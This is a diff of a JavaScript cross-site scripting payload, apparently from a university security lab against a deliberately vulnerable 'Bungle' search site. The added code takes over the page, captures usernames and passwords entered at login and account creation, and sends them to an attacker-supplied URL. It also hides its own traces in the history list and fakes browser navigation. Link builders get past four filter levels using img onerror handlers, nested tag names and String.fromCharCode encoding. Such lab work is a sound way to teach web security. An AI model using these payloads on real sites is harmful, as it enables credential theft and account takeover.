@@ -4,20 +4,166 @@
 
 // Extend this function:
 function payload(attacker) {
+
+	var forwardBtnStk = [];
+	var backBtnStk = [];
+	var curUid = 0, nextUid = 0, setUid = 0;
+	var sCrit;
+
 	function recordEvent(input) {
 		console.log(input);
 		$.get(attacker, input);
 	}
 
-	function proxy(href) {
+	function sendPostRequest(evt_name, log_evt) {
+		var usrname = $("#username").val();
+		var pwd = $("#userpass").val();
+
+		$.post("./" + evt_name, {username: usrname, password: pwd}, function(data, status) {
+			recordEvent({evt: log_evt, user: usrname, password: pwd});
+			proxy("./");
+		});
+	}
+
+	function addHistory(href) {
+		setUid++;
+		backBtnStk.push(href);
+		window.history.pushState({UID: setUid}, "", href);
+	}
+
+	function proxy(href, qry) {
+		alert(1);
+
+		if (window.history.state != null) {
+			curUid = window.history.state.UID;
+			history.replaceState(window.history.state, "", href);
+		} else {
+			history.replaceState({UID: setUid}, "", href);
+		}
+ 		
+
 		$("html").load(href, function() {
 			$("html").show();
-			$("#query").val("pwned!");
-			
+			if (qry == null || qry.length == 0) {
+				$("#query").val("pwned!");
+			} else {
+				$("#query").val(qry);
+			}
+
+			var usr = $("#logged-in-user").val();
+			recordEvent({evt: "navigation", user: usr, uri: href});
+
+			$(".history-item").each(function(item) {
+				if($(this).attr("href").indexOf("function payload(") >= 0) {
+                                       $(this).remove();
+                                }
+			});
+
+			$("#log-in-btn").on("click", function(event) {
+				alert("here login");
+				event.preventDefault();
+				sendPostRequest("login", "login");
+
+			});
+
+			$("#new-account-btn").on("click", function(event) {
+				alert("here create");
+				event.preventDefault();
+				sendPostRequest("create", "login");
+			});
+
+
+			$("#log-out-btn").on("click", function(event) {
+				event.preventDefault();
+				var usrname = $("#logged-in-user").text();
+
+				$.post("./logout",  function(){
+					recordEvent({evt: "logout", user: usrname});
+					proxy("./");
+				});
+			});
+
+			$("#bungle-lnk").on("click", function(event) {
+				event.preventDefault();
+				addHistory(href);
+				proxy("/project3/");
+
+			});
+
+			if (href.search("search?") != -1) {
+				$("a").each(function() {
+					if($(this).attr("href").indexOf("function payload(") >= 0) {
+						$(this).remove();
+					}
+					$(this).click("submit", function(event) {
+						event.preventDefault();
+						sCrit = $(this).attr("href");
+						proxy("./" + sCrit, sCrit);
+					});
+				});
+			}
+
+			$("#search-again-btn").on("click", function(event) {
+				event.preventDefault();
+				addHistory(href);
+				proxy("./", "");		
+			});
+
+			$("#search-btn").on("click", function(event) {
+				event.preventDefault();
+				sCrit = $("#query").val();
+				alert("here searcj:" + sCrit);
+				addHistory(href);
+				var outputUrl = "./search?q=" + sCrit;
+				proxy(outputUrl);
+			});
+
+
+			$(window).on("popstate", function(event) {
+				nextUid = event.state.UID;
+				var nextHref;
+
+				if (nextUid > curUid) {
+					nextHref = forwardBtnStk.pop();
+					backBtnStk.push(href);
+				} else {
+					nextHref = backBtnStk.pop();
+					forwardBtnStk.push(href);
+				}
+				proxy(nextHref);		
+			});
 		});
 	}
 	$("html").hide();
 	proxy("./");
+}
+
+function convertToCharCode(data) {
+	var convertedText = "";
+	var i = 0;
+
+	for (i = 1; i < data.length - 2;i++) {
+		convertedText += data.charCodeAt(i) + ",";
+	}
+
+	convertedText += data.charCodeAt(data.length - 2);
+	convertedText = "String.fromCharCode(" + convertedText + ")";
+
+	return convertedText;
+
+}
+
+function processUrl(url) {
+	var regex = /\"[^\"]*\"/; //match double quotes. Our script does not have any single quotes.
+	var match = regex.exec(url);
+
+	while (match != null) {
+		url = url.replace(regex, convertToCharCode(match.toString()));
+		match  = regex.exec(url);
+	}
+
+	url = url.replace(/;/g, " ");
+	return url;
 }
 
 function makeLink(xssdefense, target, attacker) {
@@ -27,21 +173,13 @@ function makeLink(xssdefense, target, attacker) {
 	if (xssdefense == 0) {
 		return 	url + encodeURIComponent("<script" + ">" + scriptBody + "</script" + ">");
 	} else if (xssdefense == 1) {
-		return url +  encodeURIComponent("<body  onload=\'" + scriptBody + "\'/>");  
+		return url + encodeURIComponent("<img src=\'abcd\' onerror=\'" + scriptBody + "\'>" + "<img/>");
 	} else if (xssdefense == 2) {
 		return url + encodeURIComponent("<scrscriptipt>" + scriptBody + " </scrscriptipt" + ">"); 
 	} else if (xssdefense == 3) {
-
-		var len  = scriptBody.length,  i = 0;
-		var encodedText = "";
-		for (i = 0; i < len -1; i++) {
-			encodedText += scriptBody.charCodeAt(i) + ",";
-		}
-
-		encodedText += scriptBody.charCodeAt(i);
-
-		return url + encodeURIComponent("<script" + ">" + "new Function(String.fromCharCode(" + encodedText + "))()" + 
-			"</script" + ">"); 
+		var encodedText = "<script" + "> " + scriptBody + " </script" + ">";
+		encodedText = processUrl(encodedText);
+		return url + encodeURIComponent(encodedText);
 	}
 }
 
